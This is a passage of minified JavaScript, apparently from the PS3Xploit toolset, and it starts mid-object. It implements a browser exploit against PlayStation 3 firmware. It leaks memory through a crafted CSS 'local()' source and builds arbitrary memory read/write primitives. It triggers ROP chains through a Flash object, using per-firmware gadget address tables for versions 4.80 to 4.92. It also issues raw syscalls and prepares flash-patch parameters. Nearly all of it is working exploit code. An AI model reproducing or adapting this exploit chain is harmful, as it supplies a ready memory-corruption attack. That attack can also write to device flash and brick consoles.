        }, this.reset = function() {
            helper.swf.clearHeap()
        }, this.queue = function(e) {
            r = $.merge(r, !0 === Array.isArray(e) ? e : [e])
        }, this.flush = function() {
            this.free(r)
        }
    },
    stack = function() {
        this.reset = function() {
            helper.swf.clearStack()
        }, this.free = function(e) {
            $.each(Array.isArray(e) ? e : [e], function(e, r) {
                2147483648 < r && helper.swf.freeSF(r)
            })
        }, this.store = function(e, r) {
            return null != e && e.length <= 4194304 && 224 <= e.length ? helper.swf.storeSF(e, r) : (4194304 < e.length ? helper.error("store: Total stack data storage is 2Mb. Current Stack Frame collection size: " + Math.floor(e.length / 1048576).toString() + " Mb") : helper.error("store: Invalid Stack Frame collection size: 0x" + Math.floor(e.length / 2048).toString() + " bytes"), 0)
        }
    },
    lockMutexes = function() {
        helper.worker.udp && helper.worker.udp.getMutex && helper.worker.udp.getMutex().lock(), helper.worker.fmm && helper.worker.fmm.getMutex && helper.worker.fmm.getMutex().lock(), helper.worker.fe && helper.worker.fe.getMutex && helper.worker.fe.getMutex().lock()
    },
    unlockMutexes = function() {
        helper.worker.udp && helper.worker.udp.getMutex && helper.worker.udp.getMutex().unlock(), helper.worker.fmm && helper.worker.fmm.getMutex && helper.worker.fmm.getMutex().unlock(), helper.worker.fe && helper.worker.fe.getMutex && helper.worker.fe.getMutex().unlock()
    },
    soundPlayer = function() {
        loadSoundAssets();
        var e = document.getElementById("PS3TSound");
        this.playOK = function() {
            if (e) {
                lockMutexes();
                try {
                    e.play_ok()
                } catch (e) {
                    Logger.debug("Sound play_ok: " + e)
                }
                unlockMutexes()
            }
        }, this.playNG = function() {
            if (e) {
                lockMutexes();
                try {
                    e.play_ng()
                } catch (e) {
                    Logger.debug("Sound play_ng: " + e)
                }
                unlockMutexes()
            }
        }
    },
    memory = function() {
        this.upeek8 = function(e) {
            return helper.swf.leakbyte(e)
        }, this.upoke8 = function(e, r) {
            helper.swf.writebyte(e, 255 & r)
        }, this.upeek32 = function(e) {
            return helper.swf.leakval32(e)
        }, this.upoke32 = function(e, r) {
            helper.swf.writeval32(e, 4294967295 & r)
        }, this.upeeks = function(e, r, t, s) {
            return helper.swf.leakbytes(e, r, t, s)
        }, this.upokes = function(e, r, t) {
            helper.swf.writebytes(e, r, t)
        }
    },
    ROP = function() {
        this.run = function(e) {
            helper.swf.triggerROP(e)
        }, this.rrun = function(e, r) {
            var t = helper.heap.store();
            helper.swf.triggerROP(e + store_r3_word(t));
            t = helper.memory.upeek32(t);
            return helper.heap.free([t]), t
        }
    },
    helper = {
        gtemp_addr: 2398617600,
        vtemp_addr: 0,
        vmode: "CEX",
        kmode: "CEX",
        ktype: "OFW",
        tversion: "1.1",
        fp9disabled_to: 0,
        timeout: !1,
        timeout2: !1,
        timeout_init: !0,
        timeout_hextable: !1,
        timeout_log: !1,
        ppc_trap_instruction: 2145386504,
        sp_exit: 2413340112,
        dbyte41: 16705,
        dbyteFF: 65535,
        qbyte41: 1094795585,
        qbyteFF: 4294967295,
        mbytes: 1048576,
        kbytes: 1024,
        sFF32: "FFFFFFFF",
        sFF64: "FFFFFFFFFFFFFFFF",
        snull32: "00000000",
        snull64: "0000000000000000",
        gadgets_box: {},
        vshgadgets_box: {},
        vshdata_storage: 6815744,
        sound_ok: 0,
        sound_ng: 0,
        system_plugin: 0,
        xmb_plugin: 0,
        edy_plugin: 0,
        osk_plugin: 0,
        download_plugin: 0,
        xmm0_interface: 0,
        webbrowser_plugin: 0,
        explore_plugin: 0,
        download_plugin_interface: 0,
        explore_plugin_interface: 0,
        webbrowser_plugin_interface: 0,
        sc_fs_open: 801,
        sc_fs_read: 802,
        sc_fs_lseek: 818,
        sc_fs_write: 803,
        sc_fs_unlink: 814,
        sc_fs_close: 804,
        sc_fs_stat: 808,
        sc_fs_mount: 837,
        sc_fs_unmount: 838,
        sc_fs_opendir: 805,
        sc_fs_readdir: 806,
        sc_fs_closedir: 807,
        sc_fs_fcntl: 817,
        sc_fs_chmod: 834,
        sc_fs_disk_free: 840,
        sc_fs_get_mount_info_size: 841,
        sc_fs_get_mount_info: 842,
        sc_ss_update_manager: 863,
        sc_dbg_consoletype: 985,
        fs_flag_readonly: 0,
        fs_flag_create: 577,
        fs_flag_create_rw: 578,
        fs_flag_create_append: 1089,
        fs_flag_create_append_rw: 1090,
        fs_mode: 438,
        sc_sso: 600,
        sc_ssr: 602,
        sc_ssw: 603,
        sc_ssgdi: 609,
        sc_ssc: 601,
        sc_ssgcf: 874,
        max_buffer_size: 67108864,
        start_write_sector_nand: 1024,
        start_write_sector_nor: 1536,
        flash_flag: "100000000000000",
        step_sector: 2048,
        sector_size: 512,
        idps_offset: 112,
        idps_sector_nor: 376,
        idps_sector_nand: 516,
        patchfile_size: 734e4,
        rospatch_size: 7340032,
        idps_nor_sigoffset: 192624,
        idps_nand_sigoffset: 264304,
        sem_attr_fifo: "000000020000020000000000000000000000000000000000726F7073656D0000",
        lwmtx_attr_fifo: "00000002000000206D74785F666D6D00",
        mtx_attr_fifo: "0000000100000020000002000000200000000000000000000000000000000000726F706D74780000",
        nofsm_hash: "",
        nofsm_url: "",
        minver: "0.00",
        patch_ros_fragment_start: "000000000000000000000000000000000000000000E000000000000000000000000000000000000000000000006FFFE0",
        patch_ros_fragment_end1: "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF",
        patch_ros_fragment_end2: "00000000000000000000000000000000",
        ioctl_flag: 4026561295,
        ioctl_flag2: 2155901711,
        stack_size: 8192,
        ppu_thread_create_joinable: 1,
        priority: 3e3,
        stat_size_offset: 40,
        sc_sm_ring_buzzer: 392,
        sys_process_getpid: 1,
        sys_process_getppid: 18,
        sys_net_accept: 700,
        sys_net_bind: 701,
        sys_net_connect: 702,
        sys_net_getpeername: 703,
        sys_net_getsockname: 704,
        sys_net_getsockopt: 705,
        sys_net_listen: 706,
        sys_net_recvfrom: 707,
        sys_net_recvmsg: 708,
        sys_net_sendto: 710,
        sys_net_setsockopt: 711,
        sys_net_poll: 715,
        sys_net_select: 716,
        sys_net_socket: 713,
        sys_net_close: 714,
        sys_net_control: 723,
        sys_net_open_dump: 717,
        sys_net_close_dump: 719,
        sys_net_ioctl: 724,
        sys_net_sendmsg: 709,
        sys_ppu_thread_get_stackinfo: 49,
        sys_ppu_thread_create: 52,
        sys_ppu_thread_stop: 50,
        sys_ppu_thread_restart: 51,
        sys_ppu_thread_getprio: 48,
        sys_ppu_thread_setprio: 47,
        sys_ppu_thread_start: 53,
        sys_ppu_thread_rename: 56,
        sys_ppu_thread_join: 44,
        sys_ppu_thread_exit: 41,
        sys_mutex_create: 100,
        sys_mutex_lock: 102,
        sys_mutex_trylock: 103,
        sys_mutex_unlock: 104,
        sys_mutex_destroy: 101,
        sys_lwmutex_create: 95,
        sys_lwmutex_lock: 97,
        sys_lwmutex_unlock: 98,
        sys_lwmutex_trylock: 99,
        sys_lwmutex_destroy: 96,
        sys_cond_create: 105,
        sys_cond_wait: 107,
        sys_cond_signal: 108,
        sys_cond_signal_to: 110,
        sys_cond_destroy: 106,
        sys_sem_create: 90,
        sys_sem_close: 91,
        sys_sem_wait: 92,
        sys_sem_trywait: 93,
        sys_sem_post: 94,
        sys_sem_getvalue: 114,
        sys_dbg_get_seminfo: 947,
        sys_event_queue_create: 128,
        sys_event_queue_destroy: 129,
        sys_event_queue_receive: 130,
        sys_event_queue_tryreceive: 131,
        sys_event_queue_drain: 133,
        sys_event_port_create: 134,
        sys_event_port_destroy: 135,
        sys_event_port_connect_local: 136,
        sys_event_port_disconnect: 137,
        sys_event_port_send: 138,
        sys_event_flag_create: 82,
        sys_event_flag_destroy: 83,
        sys_event_flag_get: 139,
        sys_event_flag_set: 87,
        sys_event_flag_wait: 85,
        sys_event_flag_trywait: 86,
        sys_event_flag_clear: 118,
        sys_memory_container_get_size: 343,
        sys_memory_get_page_attribute: 351,
        sys_memory_allocate_from_container: 350,
        sys_memory_free: 349,
        sys_prx_get_module_list: 494,
        sys_prx_get_module_info: 495,
        sys_config_open: 516,
        sys_config_close: 517,
        sys_config_register_service: 521,
        sys_timer_usleep: 141,
        sys_timer_sleep: 142,
        sock_control_flag: 2148007941,
        browser_container: 1056964612,
        dflash_name: "CELL_FS_IOS:BUILTIN_FLSH1",
        fs_fat: "CELL_FS_FAT",
        fm_usermode: 0,
        me_usermode: 0,
        ba_offset: 0,
        AF_INET: 2,
        SOCK_DGRAM: 2,
        comp: {
            node: {},
            ret: [],
            fd: -1,
            bf: 0,
            sfread: "",
            done: !1
        },
        wt_pool: [],
        worker: {
            fmm: null,
            udp: null,
            fe: null
        },
        sm: null,
        bc: null,
        sp: null,
        sctx: null,
        cookies: {},
        swfobject: {},
        heap: {},
        stack: {},
        buffer: {},
        memory: {},
        rop: {},
        swf: {},
        error: function(e) {
            throw new Error(e)
        }
    };

function fromIEEE754(e, r, t) {
    for (var s, o = [], l = e.length; l; --l) {
        s = e[l - 1];
        for (var n = 8; n; --n) o.push(s % 2 ? 1 : 0), s >>= 1
    }
    o.reverse();
    var a = o.join(""),
        i = (1 << r - 1) - 1,
        p = parseInt(a.substring(0, 1), 2) ? -1 : 1,
        d = parseInt(a.substring(1, 1 + r), 2),
        a = parseInt(a.substring(1 + r), 2);
    return (d === (1 << r) - 1 ? 0 !== a ? NaN : 1 / 0 * p : 0 < d ? p * Math.pow(2, d - i) * (1 + a / Math.pow(2, t)) : 0 !== a ? p * Math.pow(2, -(i - 1)) * (a / Math.pow(2, t)) : 0 * p).noExponents()
}

function generateIEEE754(e, r) {
    return fromIEEE754(new Array(e >> 24 & 255, e >> 16 & 255, e >> 8 & 255, 255 & e, r >> 24 & 255, r >> 16 & 255, r >> 8 & 255, 255 & r), 11, 52)
}

function generateExploit(e, r) {
    return generateIEEE754(e, (e << 32 | (r >> 1) - 1) - e)
}

function findSecBAOffset(e) {
    var r = document.getElementById("explt");
    r.style.src = "local(" + generateExploit(e - 1024, 2176) + ")";
    var t = r.style.src.substr(6, 2176).toAscii(),
        s = e - 1020,
        r = s + t.indexOf("0100000001000000") / 2,
        e = s + t.indexOf("0000100000000012") / 2,
        t = s + t.indexOf("0000100000000014") / 2;
    return r < s || e < s || t < s ? 0 : {
        buffer: r,
        low: e,
        high: t
    }
}

function findJsVariableOffset(e, r, t) {
    var s = t + 2 * e.length,
        t = document.getElementById("explt");
    t.style.src = "local(" + generateExploit(r, s) + ")";
    s = t.style.src.substr(6, s).toAscii(), e = s.indexOf(e);
    return 0 <= e ? (helper.ba_offset = parseInt(s.substr(e + 16, 8), 16), Logger.debug("Found signature at 0x" + (r + e / 2).toString(16)), {
        sig_offset: r + e / 2,
        ba_data_offset: helper.ba_offset
    }) : 0
}
var sig_search = function(e, r, t, s, o) {
    t = t || 32, s = s || 2407530496, o = o || 256;
    for (var l = 0, n = 0; 0 === l && n < o;) l = findJsVariableOffset(e, s - 65536 * n + r, t), n++;
    return l
};

function sig_scan(r) {
    var t = 0,
        s = 0,
        o = 10,
        l = 4,
        n = 0,
        a = toast("Подготовка к сканированию ОЗУ на наличие сигнатуры цели эксплоитации, подождите...", "warning", 300);
    Logger.info("Сканирование диапазона на предмет сигнатуры основной цели"), setTimeout(function() {
        ! function e() {
            return s++, t = sig_search(r, 4096 * o, 4352), o--, t && 0 !== t ? ($().toastmessage("removeToast", a), Logger.info("Обнаружена сигнатура цели эксплоитации"), void setTimeout(function() {
                document.getElementById("FP9Test").finalizeSearch(t)
            }, 250)) : o < l && 1 < n ? (ps3chk(!1), void $().toastmessage("removeToast", a)) : (o < l && n < 2 && (o = 0 === n ? 15 : 4, l = 0 === n ? 11 : 0, n++), $(".toast-item").children("p").text("Прогресс поиска целевой подписи: " + (Math.round(s / 16 * 100) - 1) + "%"), void setTimeout(function() {
                e()
            }, 200))
        }()
    }, 750)
}

function findBAOffset() {
    var e = sig_search("0100007e0100007e", 38176);
    return 0 === e && Logger.info("BA signature search failed"), e
}

function jsleak32(e) {
    var r = document.getElementById("explt");
    return r.style.src = "local(" + generateExploit(e, 16) + ")", parseInt(r.style.src.substr(6, 2).toAscii(), 16)
}

function addRefreshEvent(e, t, s) {
    jQuery("#" + e).on("refreshEvent", function(e, r) {
        disable_GUI(), setTimeout(function() {
            s && s(), jQuery("." + t).removeClass("ui-state-disabled"), jQuery().toastmessage("removeToast", r)
        }, 0)
    })
}

function ps3chk(e) {
    var r = fwv,
        t = jsleak32(jsleak32(65564) + 4);
    switch (t) {
        case 7362064:
            helper.vmode = "DEX", helper.vshdata_storage = 6881280, helper.vshgadgets_box = "4.80" === r ? {
                vtoc_addr: 7362064,
                vshdata_seg: 7083264,
                vshopd_base: 7232264,
                vgadget1_addr: 4801380,
                vgadget2_addr: 4790356,
                vgadget3_addr: 66960,
                vgadget4_addr: 6381988,
                vgadget5_addr: 80756,
                vgadget6_addr: 3483636,
                vgadget7_addr: 912264,
                vgadget8_addr: 328368,
                vgadget9_addr: 620220,
                vgadget10_addr: 1754788,
                sub_bl_to_paf_B93AFE7E_addr: 3457908,
                stdc_mbstowcs_opd_addr: 7323872,
                sdk_C7781115_opd_addr: 7321048,
                paf_B93AFE7E_opd_addr: 7268864,
                paf_F21655F3_opd_addr: 7269040,
                paf_23AFB290_opd_addr: 7268680,
                sysPrxForUser_sys_prx_get_module_list_opd_addr: 7325984,
                sysPrxForUser_sys_malloc_opd_addr: 7325880,
                sysPrxForUser_sys_free_opd_addr: 7325864,
                allocator_malloc_opd_addr: 7322056,
                allocator_free_opd_addr: 7322104,
                memset_opd_addr: 7324784,
                sys_net__sys_net_errno_loc_opd_addr: 7312800,
                sys_fs_cellFsGetFreeSize_opd_addr: 7328112,
                sys_fs_cellFsGetDirectoryEntries_opd_addr: 7327880
            } : "4.81" === r ? {
                vtoc_addr: 7362064,
                vshdata_seg: 7083264,
                vshopd_base: 7232264,
                vgadget1_addr: 4801396,
                vgadget2_addr: 4790372,
                vgadget3_addr: 66960,
                vgadget4_addr: 6382008,
                vgadget5_addr: 80756,
                vgadget6_addr: 3483624,
                vgadget7_addr: 912264,
                vgadget8_addr: 328368,
                vgadget9_addr: 620220,
                vgadget10_addr: 1754788,
                sub_bl_to_paf_B93AFE7E_addr: 3457896,
                stdc_mbstowcs_opd_addr: 7323872,
                sdk_C7781115_opd_addr: 7321048,
                paf_B93AFE7E_opd_addr: 7268864,
                paf_F21655F3_opd_addr: 7269040,
                paf_23AFB290_opd_addr: 7268680,
                sysPrxForUser_sys_prx_get_module_list_opd_addr: 7325984,
                sysPrxForUser_sys_malloc_opd_addr: 7325880,
                sysPrxForUser_sys_free_opd_addr: 7325864,
                allocator_malloc_opd_addr: 7322056,
                allocator_free_opd_addr: 7322104,
                memset_opd_addr: 7324784,
                sys_net__sys_net_errno_loc_opd_addr: 7312800,
                sys_fs_cellFsGetFreeSize_opd_addr: 7328112,
                sys_fs_cellFsGetDirectoryEntries_opd_addr: 7327880
            } : null;
            break;
        case 7296288:
            helper.vshgadgets_box = "4.80" === r ? {
                vtoc_addr: 7296288,
                vshdata_seg: 7048960,
                vshopd_base: 7166648,
                vgadget1_addr: 4769664,
                vgadget2_addr: 4758624,
                vgadget3_addr: 66960,
                vgadget4_addr: 6350216,
                vgadget5_addr: 80756,
                vgadget6_addr: 3451872,
                vgadget7_addr: 890420,
                vgadget8_addr: 328184,
                vgadget9_addr: 620036,
                vgadget10_addr: 1726040,
                sub_bl_to_paf_B93AFE7E_addr: 3426144,
                stdc_mbstowcs_opd_addr: 7258096,
                sdk_C7781115_opd_addr: 7255272,
                paf_B93AFE7E_opd_addr: 7203088,
                paf_F21655F3_opd_addr: 7203264,
                paf_23AFB290_opd_addr: 7202904,
                sysPrxForUser_sys_prx_get_module_list_opd_addr: 7260208,
                sysPrxForUser_sys_malloc_opd_addr: 7260104,
                sysPrxForUser_sys_free_opd_addr: 7260088,
                allocator_malloc_opd_addr: 7256280,
                allocator_free_opd_addr: 7256328,
                memset_opd_addr: 7259008,
                sys_net__sys_net_errno_loc_opd_addr: 7247024,
                sys_fs_cellFsGetFreeSize_opd_addr: 7262336,
                sys_fs_cellFsGetDirectoryEntries_opd_addr: 7262104
            } : "4.81" === r ? {
                vtoc_addr: 7296288,
                vshdata_seg: 7048960,
                vshopd_base: 7166648,
                vgadget1_addr: 4769664,
                vgadget2_addr: 4758640,
                vgadget3_addr: 66960,
                vgadget4_addr: 6350236,
                vgadget5_addr: 80756,
                vgadget6_addr: 3451860,
                vgadget7_addr: 890420,
                vgadget8_addr: 328184,
                vgadget9_addr: 620036,
                vgadget10_addr: 1726040,
                sub_bl_to_paf_B93AFE7E_addr: 3426132,
                stdc_mbstowcs_opd_addr: 7258096,
                sdk_C7781115_opd_addr: 7255272,
                paf_B93AFE7E_opd_addr: 7203088,
                paf_F21655F3_opd_addr: 7203264,
                paf_23AFB290_opd_addr: 7202904,
                sysPrxForUser_sys_prx_get_module_list_opd_addr: 7260208,
                sysPrxForUser_sys_malloc_opd_addr: 7260104,
                sysPrxForUser_sys_free_opd_addr: 7260088,
                allocator_malloc_opd_addr: 7256280,
                allocator_free_opd_addr: 7256328,
                memset_opd_addr: 7259008,
                sys_net__sys_net_errno_loc_opd_addr: 7247024,
                sys_fs_cellFsGetFreeSize_opd_addr: 7262336,
                sys_fs_cellFsGetDirectoryEntries_opd_addr: 7262104
            } : null;
            break;
        case 7362112:
            helper.vmode = "DEX", helper.vshdata_storage = 6881280, helper.vshgadgets_box = "4.82" === r ? {
                vtoc_addr: 7362112,
                vshdata_seg: 7085824,
                vshopd_base: 7232264,
                vgadget1_addr: 4801400,
                vgadget2_addr: 4790376,
                vgadget3_addr: 66960,
                vgadget4_addr: 6384468,
                vgadget5_addr: 80756,
                vgadget6_addr: 3483628,
                vgadget7_addr: 912264,
                vgadget8_addr: 328368,
                vgadget9_addr: 620220,
                vgadget10_addr: 1754788,
                sub_bl_to_paf_B93AFE7E_addr: 3457900,
                stdc_mbstowcs_opd_addr: 7323920,
                sdk_C7781115_opd_addr: 7321096,
                paf_B93AFE7E_opd_addr: 7268864,
                paf_F21655F3_opd_addr: 7269040,
                paf_23AFB290_opd_addr: 7268680,
                sysPrxForUser_sys_prx_get_module_list_opd_addr: 7326032,
                sysPrxForUser_sys_malloc_opd_addr: 7325928,
                sysPrxForUser_sys_free_opd_addr: 7325912,
                allocator_malloc_opd_addr: 7322104,
                allocator_free_opd_addr: 7322152,
                memset_opd_addr: 7324832,
                sys_net__sys_net_errno_loc_opd_addr: 7312848,
                sys_fs_cellFsGetFreeSize_opd_addr: 7328160,
                sys_fs_cellFsGetDirectoryEntries_opd_addr: 7327928
            } : null;
            break;
        case 7362120:
            helper.vmode = "DEX", helper.vshdata_storage = 6881280, helper.vshgadgets_box = "4.84" === r ? {
                vtoc_addr: 7362120,
                vshdata_seg: 7085952,
                vshopd_base: 7232264,
                vgadget1_addr: 4801400,
                vgadget2_addr: 4790376,
                vgadget3_addr: 66960,
                vgadget4_addr: 6384628,
                vgadget5_addr: 80756,
                vgadget6_addr: 3483628,
                vgadget7_addr: 912264,
                vgadget8_addr: 328368,
                vgadget9_addr: 620220,
                vgadget10_addr: 1754788,
                sub_bl_to_paf_B93AFE7E_addr: 3457900,
                stdc_mbstowcs_opd_addr: 7323928,
                sdk_C7781115_opd_addr: 7321104,
                paf_B93AFE7E_opd_addr: 7268864,
                paf_F21655F3_opd_addr: 7269040,
                paf_23AFB290_opd_addr: 7268680,
                sysPrxForUser_sys_prx_get_module_list_opd_addr: 7326040,
                sysPrxForUser_sys_malloc_opd_addr: 7325936,
                sysPrxForUser_sys_free_opd_addr: 7325920,
                allocator_malloc_opd_addr: 7322112,
                allocator_free_opd_addr: 7322160,
                memset_opd_addr: 7324840,
                sys_net__sys_net_errno_loc_opd_addr: 7312856,
                sys_fs_cellFsGetFreeSize_opd_addr: 7328168,
                sys_fs_cellFsGetDirectoryEntries_opd_addr: 7327936
            } : null;
            break;
        case 7296336:
            helper.vshgadgets_box = "4.82" === r ? {
                vtoc_addr: 7296336,
                vshdata_seg: 7051520,
                vshopd_base: 7166648,
                vgadget1_addr: 4769668,
                vgadget2_addr: 4758644,
                vgadget3_addr: 66960,
                vgadget4_addr: 6352696,
                vgadget5_addr: 80756,
                vgadget6_addr: 3451864,
                vgadget7_addr: 890420,
                vgadget8_addr: 328184,
                vgadget9_addr: 620036,
                vgadget10_addr: 1726040,
                sub_bl_to_paf_B93AFE7E_addr: 3426136,
                stdc_mbstowcs_opd_addr: 7258144,
                sdk_C7781115_opd_addr: 7255320,
                paf_B93AFE7E_opd_addr: 7203088,
                paf_F21655F3_opd_addr: 7203264,
                paf_23AFB290_opd_addr: 7202904,
                sysPrxForUser_sys_prx_get_module_list_opd_addr: 7260256,
                sysPrxForUser_sys_malloc_opd_addr: 7260152,
                sysPrxForUser_sys_free_opd_addr: 7260136,
                allocator_malloc_opd_addr: 7256328,
                allocator_free_opd_addr: 7256376,
                memset_opd_addr: 7259056,
                sys_net__sys_net_errno_loc_opd_addr: 7247072,
                sys_fs_cellFsGetFreeSize_opd_addr: 7262384,
                sys_fs_cellFsGetDirectoryEntries_opd_addr: 7262152
            } : null;
            break;
        case 7296344:
            helper.vshgadgets_box = "4.83" === r || "4.84" === r || "4.85" === r || "4.86" === r || "4.87" === r || "4.88" === r || "4.89" === r || "4.90" === r || "4.91" === r || "4.92" === r ? {
                vtoc_addr: 7296344,
                vshdata_seg: 7051648,
                vshopd_base: 7166648,
                vgadget1_addr: 4769668,
                vgadget2_addr: 4758644,
                vgadget3_addr: 66960,
                vgadget4_addr: 6352856,
                vgadget5_addr: 80756,
                vgadget6_addr: 3451864,
                vgadget7_addr: 890420,
                vgadget8_addr: 328184,
                vgadget9_addr: 620036,
                vgadget10_addr: 1726040,
                sub_bl_to_paf_B93AFE7E_addr: 3426136,
                stdc_mbstowcs_opd_addr: 7258152,
                sdk_C7781115_opd_addr: 7255328,
                paf_B93AFE7E_opd_addr: 7203088,
                paf_F21655F3_opd_addr: 7203264,
                paf_23AFB290_opd_addr: 7202904,
                sysPrxForUser_sys_prx_get_module_list_opd_addr: 7260264,
                sysPrxForUser_sys_malloc_opd_addr: 7260160,
                sysPrxForUser_sys_free_opd_addr: 7260144,
                allocator_malloc_opd_addr: 7256336,
                allocator_free_opd_addr: 7256384,
                memset_opd_addr: 7259064,
                sys_net__sys_net_errno_loc_opd_addr: 7247080,
                sys_fs_cellFsGetFreeSize_opd_addr: 7262392,
                sys_fs_cellFsGetDirectoryEntries_opd_addr: 7262160
            } : null;
            break;
        default:
            helper.vshgadgets_box = null
    }
    if (helper.vshgadgets_box)
        if (e) {
            Logger.info("Setting RW primitive complete"), helper.swf = document.getElementById("FP9Test"), helper.heap = new heap, helper.stack = new stack, helper.buffer = new buffer, helper.memory = new memory, helper.rop = new ROP, helper.gadgets_box = new Gadgets, helper.gtemp_addr = helper.heap.store(8192) + 4096, Cookies.defaults = {
                domain: "www.ps3xploit.net",
                expires: 1,
                secure: !0,
                sameSite: "strict"
            }, helper.cookies = Cookies;
            var s = helper.cookies.get("udp_conn"),
                o = $("#" + Logger.tbport());
            0 < s && (Logger.info("Restoring UDP Port user setting"), o.val(s)), helper.sm = new sysmem, helper.wt_pool = ["BGTOOLSET_WKR_UDP", "BGTOOLSET_WKR_FMM", "BGTOOLSET_WKR_FE"], clearThreadSession(!0);
            var l = $("#" + Logger.iptnet()),
                o = $("#" + Logger.tbport()),
                s = !1;

            function n() {
                l.on("click", function() {
                    disable_GUI(), !0 === this.checked ? setTimeout(function() {
                        var e = o.val(),
                            r = parseInt(e);
                        r.toString() !== e && (Logger.error("Port " + e + " is invalid.\n Setting UDP port to default 18194"), e = "18194", o.val(e), r = 18194), 0 < r && r < 65536 && (helper.bc || (helper.bc = new UDPBroadcaster), Logger.info("Debug UDP Broadcasting on port " + e), 0 === helper.bc.open(e) && (helper.cookies.set("udp_conn", e), setTimeout(function() {
                            enable_GUI(), o.removeClass("ui-state-disabled").addClass("ui-state-disabled")
                        }, 150)))
                    }, 0) : (setTimeout(function() {
                        helper.bc && helper.bc.close(), Logger.info("Debug UDP Broadcasting closed"), o.removeClass("ui-state-disabled"), enable_GUI()
                    }, 100), this.checked = !1)
                }), l.parent().children("label").removeClass("ui-state-disabled")
            }
            helper.cookies.get("udp_socket") ? setTimeout(function() {
                var e = helper.cookies.getJSON("udp_socket");
                o.val(e.port), helper.bc = new UDPBroadcaster(e), helper.bc.open(), l.parent().children("label").removeClass("ui-state-disabled"), l.click(), l.parent().children("label").removeClass("ui-state-disabled").addClass("ui-state-disabled"), s = !0, o.removeClass("ui-state-disabled").addClass("ui-state-disabled"), n(), Logger.info("UDP Port " + e.port + " reacquired")
            }, 500) : (helper.bc = new UDPBroadcaster, n());
            var a = helper.heap.store(8),
                i = helper.heap.store();
            helper.kmode = function() {
                helper.rop.run(syscall32(helper.sc_dbg_consoletype, a));
                var e = helper.memory.upeek32(a + 4);
                return 1 === e ? "CEX" : 2 === e ? "DEX" : 3 === e ? "DECR" : "Unknown"
            }();
            e = function() {
                var e = helper.rop.rrun(syscall(6, UInt64("8000000000000000")));
                Logger.debug("peek_sc6 ret: 0x" + e.toString(16)), helper.rop.run(syscall32(8, 28672, i));
                var r = helper.memory.upeek32(i);
                Logger.debug("sc8_peekval: 0x" + r.toString(16));
                var t = helper.rop.rrun(syscall32(8, 4919));
                Logger.debug("peek_sc_hen ret: 0x" + t.toString(16));
                var s = helper.rop.rrun(syscall32(1022, 32767));
                return Logger.debug("peek_sc1022 ret: 0x" + s.toString(16)), 1638 === s ? "MAMBA" : 4919 === t ? "HEN" : 0 < r ? "COBRA" : 0 === e ? "CFW" : "Нет"
            }();
            switch (helper.ktype = "Нет" !== e, t) {
                case 7362064:
                    helper.nofsm_hash = "4.80" === r ? "CEX" === helper.kmode ? "BA76A94AD77E456A40A7C0C6349F267AB2D676B95A345A76578EFCCB4973442D" : "" : "4.81" === r && "CEX" === helper.kmode ? "85BF81577D8B2AE372D567121AF7C41BADC279B486964D9EAAE372E0595F4FF4" : "", helper.nofsm_url = "4.80" === r ? "CEX" === helper.kmode ? "nofsm_patch_480.bin" : "" : "4.81" === r && "CEX" === helper.kmode ? "nofsm_patch_481.bin" : "";
                    break;
                case 7296288:
                    helper.nofsm_hash = "4.80" === r ? "BA76A94AD77E456A40A7C0C6349F267AB2D676B95A345A76578EFCCB4973442D" : "4.81" === r ? "85BF81577D8B2AE372D567121AF7C41BADC279B486964D9EAAE372E0595F4FF4" : "", helper.nofsm_url = "4.80" === r ? "nofsm_patch_480.bin" : "4.81" === r ? "nofsm_patch_481.bin" : "";
                    break;
                case 7362112:
                    helper.nofsm_hash = "4.82" === r && "CEX" === helper.kmode ? "1639F41F6D1E9658F22EA7ED1E961E5A4DE3640A19E945A8B0C9CC84A90F558A" : "", helper.nofsm_url = "4.82" === r && "CEX" === helper.kmode ? "nofsm_patch_482.bin" : "";
                    break;
                case 7362120:
                    helper.nofsm_hash = "4.84" === r && "CEX" === helper.kmode ? "597D32AD3CEA591003966B3C077400FD3903AB488705052CBB3F60AAA0837D21" : "", helper.nofsm_url = "4.84" === r && "CEX" === helper.kmode ? "nofsm_patch_484.bin" : "";
                    break;
                case 7296336:
                    helper.nofsm_hash = "4.82" === r ? "1639F41F6D1E9658F22EA7ED1E961E5A4DE3640A19E945A8B0C9CC84A90F558A" : "", helper.nofsm_url = "4.82" === r ? "nofsm_patch_482.bin" : "";
                    break;
                case 7296344:
                    helper.nofsm_hash = "4.83" === r ? "DC5213CAAF7B85D9B4D47BD3E015711BF4C4EA5F899DC85CD31CC63176B24CE2" : "4.84" === r ? "597D32AD3CEA591003966B3C077400FD3903AB488705052CBB3F60AAA0837D21" : "4.85" === r ? "A17D20F3F5E0DCD9FD0F3F34F413550F751AE2005075A737969854BAE549C545" : "4.86" === r ? "B5B7D07D0432D1876C9DD19D780A80AF67CF9BA82FCD09ECBEDF236F30C3C44A" : "4.87" === r ? "25128F851C0B89CF4D830F0A4917C1C971FA2489B50F4084ED77FB429AB7E740" : "4.88" === r ? "EAE06949E2DEA732D13CF7BEF9C0A706EC71B5032410D277AE1554E89CE9D2ED" : "4.89" === r ? "7ECCF29015432182531CCF50EBAABCEA3866DD25320200CBD9440BA31C0C35ED" : "4.90" === r ? "0AFA49873AE61631AE0D779D3580C24A7B3D57667235B0B3AA70CBDF082CF1FD" : "4.91" === r ? "B307F35DFE67968FA8F7157FB22B7AB686BE6B3628C12463F1F8EE3AAABCB558" : "4.92" === r ? "14D903DB4D568633552B85F5A3F053E8F0B181B0933362A10F11D98F7D9E4520" : "", helper.nofsm_url = "4.83" === r ? "nofsm_patch_483.bin" : "4.84" === r ? "nofsm_patch_484.bin" : "4.85" === r ? "nofsm_patch_485.bin" : "4.86" === r ? "nofsm_patch_486.bin" : "4.87" === r ? "nofsm_patch_487.bin" : "4.88" === r ? "nofsm_patch_488.bin" : "4.89" === r ? "nofsm_patch_489.bin" : "4.90" === r ? "nofsm_patch_490.bin" : "4.91" === r ? "nofsm_patch_491.bin" : "4.92" === r ? "nofsm_patch_492.bin" : ""
            }
